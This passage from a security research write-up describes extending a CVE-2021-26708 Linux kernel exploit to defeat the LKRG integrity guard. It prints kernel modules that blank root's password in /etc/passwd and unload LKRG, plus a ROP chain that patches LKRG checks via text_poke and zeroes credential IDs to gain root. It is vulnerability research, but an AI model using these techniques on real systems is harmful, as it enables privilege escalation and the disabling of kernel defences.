rax ; ret</code> gadget in my kernel memory dump).</p>

<p>The final <code class="language-plaintext highlighter-rouge">RET</code> instruction returns from the shellcode, the <code class="language-plaintext highlighter-rouge">recv()</code> syscall handling continues, but now the exploit process runs with <code class="language-plaintext highlighter-rouge">root</code> privileges.</p>

<h2 id="oh-i-always-wanted-to-hack-lkrg">Oh, I always wanted to hack LKRG!</h2>

<p>The <a href="https://github.com/openwall/lkrg">Linux Kernel Runtime Guard</a> (LKRG) is an amazing project! It's a Linux kernel module that performs runtime integrity checking of the kernel and detects kernel vulnerability exploits. The aim of <a href="https://www.openwall.com/presentations/OSTconf2020-LKRG-In-A-Nutshell/">LKRG anti-exploit functionality</a> is to detect specific kernel data corruption performed during vulnerability exploitation:</p>

<ul>
  <li>Illegal elevation of privileges (EoP)
    <ul>
      <li>Illegal calling of the <code class="language-plaintext highlighter-rouge">commit_creds()</code> function</li>
      <li>Overwriting the <code class="language-plaintext highlighter-rouge">struct cred</code></li>
    </ul>
  </li>
  <li>Sandbox and namespace escapes</li>
  <li>Illegal changing of the CPU state (for example, disabling <code class="language-plaintext highlighter-rouge">SMEP</code> and <code class="language-plaintext highlighter-rouge">SMAP</code> on <code class="language-plaintext highlighter-rouge">x86_64</code>)</li>
  <li>Illegal changing of the kernel <code class="language-plaintext highlighter-rouge">.text</code> and <code class="language-plaintext highlighter-rouge">.rodata</code></li>
  <li>Kernel stack pivoting and ROP</li>
  <li>Many more</li>
</ul>

<center><img src="./2021 - Improving the exploit for CVE-2021-26708 in the Linux kernel to bypass LKRG_files/lkrg.png" width="40%"></center>
<p><br></p>

<p>This project is hosted by <a href="https://www.openwall.com/lkrg/">Openwall</a>. It is mostly being developed by <a href="https://twitter.com/Adam_pi3">Adam 'pi3' Zabrocki</a> in his spare time. LKRG is currently in a beta version, but developers are trying to keep it super stable and portable across various kernels. Adam also says:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>We are aware that LKRG is bypassable by design (as we have always spoken openly)
but such bypasses are neither easy nor cheap/reliable.
</code></pre></div></div>

<p><a href="https://github.com/milabs">Ilya Matveychikov</a> has done some work in this area, collecting his LKRG bypass methods in a <a href="https://github.com/milabs/lkrg-bypass">separate repository</a>. However, Adam analyzed Ilya's work and <a href="https://www.openwall.com/lists/lkrg-users/2019/02/21/2">improved LKRG</a> to mitigate these bypass methods.</p>

<p>So, I decided to upgrade my <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-26708">CVE-2021-26708</a> exploit further and develop a new way to bypass LKRG. Now things get interesting!</p>

<p>My first thought was:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>OK, LKRG is tracking illegal EoP, but it does not track access to <span class="s1">'/etc/passwd'</span><span class="nb">.</span>
I can try to bypass it by disabling the root password via <span class="s1">'/etc/passwd'</span><span class="o">!</span>
Executing <span class="s1">'su'</span> after that should look absolutely legal to LKRG.
</code></pre></div></div>

<p>I wrote a quick prototype in the form of a kernel module:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;linux/module.h&gt;
#include &lt;linux/kallsyms.h&gt;
</span>
<span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">pwdhack_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="kt">char</span> <span class="o">*</span><span class="n">str</span> <span class="o">=</span> <span class="s">"root::0:0:root:/root:/bin/bash</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
	<span class="kt">ssize_t</span> <span class="n">wret</span><span class="p">;</span>
	<span class="n">loff_t</span> <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="n">pr_notice</span><span class="p">(</span><span class="s">"pwdhack: init</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

	<span class="n">f</span> <span class="o">=</span> <span class="n">filp_open</span><span class="p">(</span><span class="s">"/etc/passwd"</span><span class="p">,</span> <span class="n">O_WRONLY</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">IS_ERR</span><span class="p">(</span><span class="n">f</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">pr_err</span><span class="p">(</span><span class="s">"pwdhack: filp_open() failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">wret</span> <span class="o">=</span> <span class="n">kernel_write</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">str</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">str</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">pos</span><span class="p">);</span>
	<span class="n">printk</span><span class="p">(</span><span class="s">"pwdhack: kernel_write() returned %ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">wret</span><span class="p">);</span>

	<span class="n">pr_notice</span><span class="p">(</span><span class="s">"pwdhack: done</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">pwdhack_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">pr_notice</span><span class="p">(</span><span class="s">"pwdhack: exit</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">module_init</span><span class="p">(</span><span class="n">pwdhack_init</span><span class="p">)</span>
<span class="n">module_exit</span><span class="p">(</span><span class="n">pwdhack_exit</span><span class="p">)</span>

<span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">"GPL v2"</span><span class="p">);</span>
</code></pre></div></div>

<p>This module overwrites the first line in <code class="language-plaintext highlighter-rouge">/etc/passwd</code> with <code class="language-plaintext highlighter-rouge">root::0:0:root:/root:/bin/bash\n</code>. This effectively disables the password for <code class="language-plaintext highlighter-rouge">root</code>, and then an unprivileged user executing <code class="language-plaintext highlighter-rouge">su</code> freely becomes <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p>I reimplemented this logic with <code class="language-plaintext highlighter-rouge">filp_open()</code> and <code class="language-plaintext highlighter-rouge">kernel_write()</code> in my ROP chain, but it failed to open <code class="language-plaintext highlighter-rouge">/etc/passwd</code>. It turned out that the kernel checks the process credentials and SELinux metadata even when a file is opened from the kernelspace. Overwriting them before <code class="language-plaintext highlighter-rouge">filp_open()</code> doesn't help because LKRG tracks them and kills any offending process.</p>

<h2 id="no-more-hiding-lets-destroy-lkrg">No more hiding, let's destroy LKRG!</h2>

<p>Suddenly I decided not to hide from LKRG. Instead, I got the idea to attack and destroy LKRG from my ROP chain!</p>

<center><img src="./2021 - Improving the exploit for CVE-2021-26708 in the Linux kernel to bypass LKRG_files/snowballs.jpg" width="85%">
<br>Anatoly Volkov: Snowballs (1957)
</center>
<p><br></p>

<p>The straightforward approach is to unload the LKRG module from the kernel. I made another tiny kernel module to check this hypothesis:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;linux/module.h&gt;
#include &lt;linux/kallsyms.h&gt;
</span>
<span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">destroy_lkrg_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">module</span> <span class="o">*</span><span class="n">lkrg_mod</span> <span class="o">=</span> <span class="n">find_module</span><span class="p">(</span><span class="s">"p_lkrg"</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">lkrg_mod</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">pr_notice</span><span class="p">(</span><span class="s">"destroy_lkrg: p_lkrg module is NOT found</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">lkrg_mod</span><span class="o">-&gt;</span><span class="n">exit</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">pr_notice</span><span class="p">(</span><span class="s">"destroy_lkrg: p_lkrg module has no exit method</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">pr_notice</span><span class="p">(</span><span class="s">"destroy_lkrg: p_lkrg module is found, remove it brutally!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">lkrg_mod</span><span class="o">-&gt;</span><span class="n">exit</span><span class="p">();</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">destroy_lkrg_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">pr_notice</span><span class="p">(</span><span class="s">"destroy_lkrg: exit</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">module_init</span><span class="p">(</span><span class="n">destroy_lkrg_init</span><span class="p">)</span>
<span class="n">module_exit</span><span class="p">(</span><span class="n">destroy_lkrg_exit</span><span class="p">)</span>

<span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">"GPL v2"</span><span class="p">);</span>
</code></pre></div></div>

<p>It seemed to be an idea that would work; the LKRG module was unloaded. I reimplemented this logic with <code class="language-plaintext highlighter-rouge">find_module()</code> and LKRG <code class="language-plaintext highlighter-rouge">exit()</code> in my ROP chain, but it failed. Why? In the middle of <code class="language-plaintext highlighter-rouge">p_lkrg_deregister()</code>, LKRG calls the <code class="language-plaintext highlighter-rouge">schedule()</code> kernel function, which has an LKRG hook performing the <code class="language-plaintext highlighter-rouge">pCFI</code> check. It detects my stack pivoting and kills the exploit process in the middle of the LKRG module unloading. Alas!</p>

<p>I started to think about another approach to destroying LKRG and got the idea to disable <code class="language-plaintext highlighter-rouge">kprobes</code>. In fact, <code class="language-plaintext highlighter-rouge">kprobes</code> (and <code class="language-plaintext highlighter-rouge">kretprobes</code>) are used by LKRG for planting checking hooks all over the kernel code. First, I tried to disable them using an existing <code class="language-plaintext highlighter-rouge">debugfs</code> interface:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">[root@localhost ~]#</span><span class="w"> </span><span class="nb">echo </span>0 <span class="o">&gt;</span> /sys/kernel/debug/kprobes/enabled
</code></pre></div></div>

<p>This should disarm all enabled <code class="language-plaintext highlighter-rouge">kprobes</code>. I tried that on a system with a loaded LKRG module, but after a couple of seconds, the kernel hanged completely. There might be some deadlock or infinite loop caused by LKRG, but I didn't spend any more time on that.</p>

<p>Debugging the kernel with LKRG is actually not that convenient. It took me some time to realize why the Linux kernel with LKRG crashes every time I try to debug it. In fact, setting a breakpoint for a kernel function in <code class="language-plaintext highlighter-rouge">gdb</code> changes the kernel code. So, LKRG in a parallel thread sees that as kernel integrity violation and crashes the kernel unexpectedly for me, while I'm staring at the debugger trying to understand what's going on :)</p>

<h2 id="a-successful-attack-against-lkrg">A successful attack against LKRG</h2>

<p>Finally, I created a working attack against LKRG. In my ROP chain, I patched the LKRG code itself! The first function that I patched is <code class="language-plaintext highlighter-rouge">p_check_integrity()</code>, which is responsible for checking the Linux kernel integrity. The second function that I patched is <code class="language-plaintext highlighter-rouge">p_cmp_creds()</code>, which checks the credentials of processes running in the system against the LKRG database to detect illegal elevation of privileges.</p>

<p>I patched these functions with <code class="language-plaintext highlighter-rouge">0x48 0x31 0xc0 0xc3</code>, which is <code class="language-plaintext highlighter-rouge">xor rax, rax ; ret</code> or <code class="language-plaintext highlighter-rouge">return 0</code>. Then, I escalated the privileges. Hurray! Let's look at the final ROP chain:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">rop_gadget</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">xattr_addr</span> <span class="o">+</span> <span class="n">MY_UINFO_OFFSET</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
<span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="cp">#define SAVED_RSP_OFFSET	3400
</span>
<span class="cp">#define ROP_MOV_RAX_R9_RET		(0xFFFFFFFF8106BDA4lu + kaslr_offset)
#define ROP_POP_RDX_RET			(0xFFFFFFFF8105ED4Dlu + kaslr_offset)
#define ROP_AND_RAX_RDX_RET		(0xFFFFFFFF8101AD34lu + kaslr_offset)
#define ROP_ADD_RAX_RCX_RET		(0xFFFFFFFF8102BA35lu + kaslr_offset)
#define ROP_MOV_RDX_RAX_RET		(0xFFFFFFFF81999A1Dlu + kaslr_offset)
#define ROP_POP_RAX_RET			(0xFFFFFFFF81015BF4lu + kaslr_offset)
#define ROP_MOV_QWORD_PTR_RAX_RDX_RET	(0xFFFFFFFF81B6CB17lu + kaslr_offset)
</span>
<span class="cm">/* 1. Save RSP */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_MOV_RAX_R9_RET</span><span class="p">;</span>	<span class="cm">/* mov rax, r9 ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_POP_RDX_RET</span><span class="p">;</span>	<span class="cm">/* pop rdx ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff00000000lu</span><span class="p">;</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_AND_RAX_RDX_RET</span><span class="p">;</span>	<span class="cm">/* and rax, rdx ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_ADD_RAX_RCX_RET</span><span class="p">;</span>	<span class="cm">/* add rax, rcx ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_MOV_RDX_RAX_RET</span><span class="p">;</span>	<span class="cm">/* mov rdx, rax ; shr rax, 0x20 ; xor eax, edx ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_POP_RAX_RET</span><span class="p">;</span>	<span class="cm">/* pop rax ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uaf_write_value</span> <span class="o">+</span> <span class="n">SAVED_RSP_OFFSET</span><span class="p">;</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_MOV_QWORD_PTR_RAX_RDX_RET</span><span class="p">;</span> <span class="cm">/* mov qword ptr [rax], rdx ; ret */</span>
</code></pre></div></div>

<p>This part reconstructs the original <code class="language-plaintext highlighter-rouge">RSP</code> value from the bits in <code class="language-plaintext highlighter-rouge">ECX</code> and <code class="language-plaintext highlighter-rouge">R9</code> (I described this earlier). Now, however, I save the stack pointer to the <code class="language-plaintext highlighter-rouge">sk_buff</code> data at <code class="language-plaintext highlighter-rouge">SAVED_RSP_OFFSET</code> to avoid storing it in a dedicated register.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define KALLSYMS_LOOKUP_NAME 	(0xffffffff81183dc0lu + kaslr_offset)
#define FUNCNAME_OFFSET_1	3550
</span>
<span class="cp">#define ROP_POP_RDI_RET				(0xFFFFFFFF81004652lu + kaslr_offset)
#define ROP_JMP_RAX				(0xFFFFFFFF81000087lu + kaslr_offset)
</span>
<span class="cm">/* 2. Destroy lkrg : part 1 */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_POP_RAX_RET</span><span class="p">;</span>	<span class="cm">/* pop rax ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">KALLSYMS_LOOKUP_NAME</span><span class="p">;</span>
		  <span class="cm">/* unsigned long kallsyms_lookup_name(const char *name) */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_POP_RDI_RET</span><span class="p">;</span>	<span class="cm">/* pop rdi ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uaf_write_value</span> <span class="o">+</span> <span class="n">FUNCNAME_OFFSET_1</span><span class="p">;</span>
<span class="n">strncpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">xattr_addr</span> <span class="o">+</span> <span class="n">FUNCNAME_OFFSET_1</span><span class="p">,</span> <span class="s">"p_cmp_creds"</span><span class="p">,</span> <span class="mi">12</span><span class="p">);</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_JMP_RAX</span><span class="p">;</span>		<span class="cm">/* jmp rax */</span>
</code></pre></div></div>

<p>This part of the ROP chain calls <code class="language-plaintext highlighter-rouge">kallsyms_lookup_name("p_cmp_creds")</code>. The <code class="language-plaintext highlighter-rouge">sk_buff</code> data at <code class="language-plaintext highlighter-rouge">FUNCNAME_OFFSET_1</code> stores the <code class="language-plaintext highlighter-rouge">"p_cmp_creds"</code> string. Its address is loaded to <code class="language-plaintext highlighter-rouge">RDI</code>, which should contain the first function argument according to the calling convention of System V AMD64 ABI.</p>

<p><strong>Note:</strong> The <code class="language-plaintext highlighter-rouge">lkrg.hide</code> configuration option is set to 0 by default, which allows attackers to find the LKRG functions easily using <code class="language-plaintext highlighter-rouge">kallsyms_lookup_name()</code>. There are also other methods to find these functions.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define XOR_RAX_RAX_RET				(0xFFFFFFFF810859C0lu + kaslr_offset)
#define ROP_TEST_RAX_RAX_CMOVE_RAX_RDX_RET	(0xFFFFFFFF81196AA2lu + kaslr_offset)
</span>
<span class="cm">/* If lkrg function is not found, let's patch "xor rax, rax ; ret" */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_POP_RDX_RET</span><span class="p">;</span>	<span class="cm">/* pop rdx ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">XOR_RAX_RAX_RET</span><span class="p">;</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_TEST_RAX_RAX_CMOVE_RAX_RDX_RET</span><span class="p">;</span> <span class="cm">/* test rax, rax ; cmove rax, rdx ; ret*/</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">kallsyms_lookup_name()</code> function returns the address of <code class="language-plaintext highlighter-rouge">p_cmp_creds()</code> in <code class="language-plaintext highlighter-rouge">RAX</code>. If the LKRG module is not loaded, <code class="language-plaintext highlighter-rouge">kallsyms_lookup_name()</code> returns <code class="language-plaintext highlighter-rouge">NULL</code>. I wanted my shellcode to work in both cases and invented this trick:</p>
<ol>
  <li>I found the address of <code class="language-plaintext highlighter-rouge">xor rax, rax ; ret</code> in the kernel memory dump (defined here as <code class="language-plaintext highlighter-rouge">XOR_RAX_RAX_RET</code>)</li>
  <li>This address is loaded to <code class="language-plaintext highlighter-rouge">RDX</code></li>
  <li>If <code class="language-plaintext highlighter-rouge">kallsyms_lookup_name("p_cmp_creds")</code> returns <code class="language-plaintext highlighter-rouge">NULL</code>, this address is loaded to <code class="language-plaintext highlighter-rouge">RAX</code>. This is performed using the conditional move instruction in the <code class="language-plaintext highlighter-rouge">test rax, rax ; cmove rax, rdx ; ret</code> gadget.</li>
</ol>

<p>Which is great! In other words, if LKRG is loaded, the shellcode patches the code of <code class="language-plaintext highlighter-rouge">p_cmp_creds()</code> with <code class="language-plaintext highlighter-rouge">xor rax, rax ; ret</code>. And, if LKRG is absent, the shellcode patches <code class="language-plaintext highlighter-rouge">xor rax, rax ; ret</code> with the same bytes and avoids the kernel crash. This is performed in the following part of the ROP chain:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define TEXT_POKE		(0xffffffff81031300lu + kaslr_offset)
#define CODE_PATCH_OFFSET	3450
</span>
<span class="cp">#define ROP_MOV_RDI_RAX_POP_RBX_RET		(0xFFFFFFFF81020ABDlu + kaslr_offset)
#define ROP_POP_RSI_RET				(0xFFFFFFFF810006A4lu + kaslr_offset)
</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_MOV_RDI_RAX_POP_RBX_RET</span><span class="p">;</span>
		  <span class="cm">/* mov rdi, rax ; mov eax, ebx ; pop rbx ; or rax, rdi ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1337</span><span class="p">;</span>	   <span class="cm">/* dummy value for RBX */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_POP_RSI_RET</span><span class="p">;</span> <span class="cm">/* pop rsi ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uaf_write_value</span> <span class="o">+</span> <span class="n">CODE_PATCH_OFFSET</span><span class="p">;</span>
<span class="n">strncpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">xattr_addr</span> <span class="o">+</span> <span class="n">CODE_PATCH_OFFSET</span><span class="p">,</span> <span class="s">"</span><span class="se">\x48\x31\xc0\xc3</span><span class="s">"</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_POP_RDX_RET</span><span class="p">;</span> <span class="cm">/* pop rdx ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_POP_RAX_RET</span><span class="p">;</span> <span class="cm">/* pop rax ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">TEXT_POKE</span><span class="p">;</span>
		  <span class="cm">/* void *text_poke(void *addr, const void *opcode, size_t len) */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_JMP_RAX</span><span class="p">;</span>	   <span class="cm">/* jmp rax */</span>
</code></pre></div></div>

<p>Here, the shellcode prepares the arguments and calls <code class="language-plaintext highlighter-rouge">text_poke()</code> for code patching:</p>
<ol>
  <li>The address in <code class="language-plaintext highlighter-rouge">RAX</code> is stored in <code class="language-plaintext highlighter-rouge">RDI</code> as the first argument of the function. Unfortunately, I couldn’t find a smaller gadget doing that, so here, the ROP chain contains the dummy value for <code class="language-plaintext highlighter-rouge">RBX</code> that is loaded from the kernel stack in the first gadget</li>
  <li>The <code class="language-plaintext highlighter-rouge">sk_buff</code> data at <code class="language-plaintext highlighter-rouge">CODE_PATCH_OFFSET</code> stores the patching payload <code class="language-plaintext highlighter-rouge">0x48 0x31 0xc0 0xc3</code>. Its address is stored in <code class="language-plaintext highlighter-rouge">RSI</code> as the second argument of the function</li>
  <li>The third argument of <code class="language-plaintext highlighter-rouge">text_poke()</code> is the length of the payload. It is provided via the <code class="language-plaintext highlighter-rouge">RDX</code> register storing 4.</li>
</ol>

<p>The <a href="https://elixir.bootlin.com/linux/v5.10/source/arch/x86/kernel/alternative.c#L959"><code class="language-plaintext highlighter-rouge">text_poke()</code></a> kernel function updates instructions on a live kernel. It remaps the code page and performs <code class="language-plaintext highlighter-rouge">memcpy()</code>. This trick is used by <code class="language-plaintext highlighter-rouge">kprobes</code> and other kernel mechanisms.</p>

<p>Then, the same procedure with <code class="language-plaintext highlighter-rouge">kallsyms_lookup_name()</code>, <code class="language-plaintext highlighter-rouge">cmove</code> and <code class="language-plaintext highlighter-rouge">text_poke()</code> is performed for patching the <code class="language-plaintext highlighter-rouge">p_check_integrity()</code> function of the LKRG module. When that is done, LKRG is helpless and the shellcode can perform the privilege escalation (as described earlier):</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define ROP_MOV_QWORD_PTR_RAX_0_RET	(0xFFFFFFFF8112E6D7lu + kaslr_offset)
</span>
<span class="cm">/* 3. Perform privilege escalation */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_POP_RAX_RET</span><span class="p">;</span>		<span class="cm">/* pop rax ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">owner_cred</span> <span class="o">+</span> <span class="n">CRED_UID_GID_OFFSET</span><span class="p">;</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_MOV_QWORD_PTR_RAX_0_RET</span><span class="p">;</span>	<span class="cm">/* mov qword ptr [rax], 0 ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_POP_RAX_RET</span><span class="p">;</span>		<span class="cm">/* pop rax ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">owner_cred</span> <span class="o">+</span> <span class="n">CRED_EUID_EGID_OFFSET</span><span class="p">;</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_MOV_QWORD_PTR_RAX_0_RET</span><span class="p">;</span>	<span class="cm">/* mov qword ptr [rax], 0 ; ret */</span>
</code></pre></div></div>

<p>In the final part, the ROP chain restores the original <code class="language-plaintext highlighter-rouge">RSP</code> value from the <code class="language-plaintext highlighter-rouge">sk_buff</code> data at <code class="language-plaintext highlighter-rouge">SAVED_RSP_OFFSET</code>, where it was saved in the beginning:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* 4. Restore RSP and continue */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_POP_RAX_RET</span><span class="p">;</span>		 <span class="cm">/* pop rax ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uaf_write_value</span> <span class="o">+</span> <span class="n">SAVED_RSP_OFFSET</span><span class="p">;</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_MOV_RAX_QWORD_PTR_RAX_RET</span><span class="p">;</span> <span class="cm">/* mov rax, qword ptr [rax] ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_PUSH_RAX_POP_RBX_RET</span><span class="p">;</span>	 <span class="cm">/* push rax ; pop rbx ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_PUSH_RBX_POP_RSP_RET</span><span class="p">;</span>
		  <span class="cm">/* push rbx ; add eax, 0x415d0060 ; pop rsp ; ret */</span>
</code></pre></div></div>

<p>Then the <code class="language-plaintext highlighter-rouge">recv()</code> syscall handling continues with <code class="language-plaintext highlighter-rouge">root</code> privileges.</p>

<p>Phew! That was the most complicated part of the article.</p>

<center><img src="./2021 - Improving the exploit for CVE-2021-26708 in the Linux kernel to bypass LKRG_files/detail.png" width="85%">
<br>Nikolay Lomakin: First Product (1953)
</center>
<p><br></p>

<h2 id="responsible-disclosure">Responsible disclosure</h2>

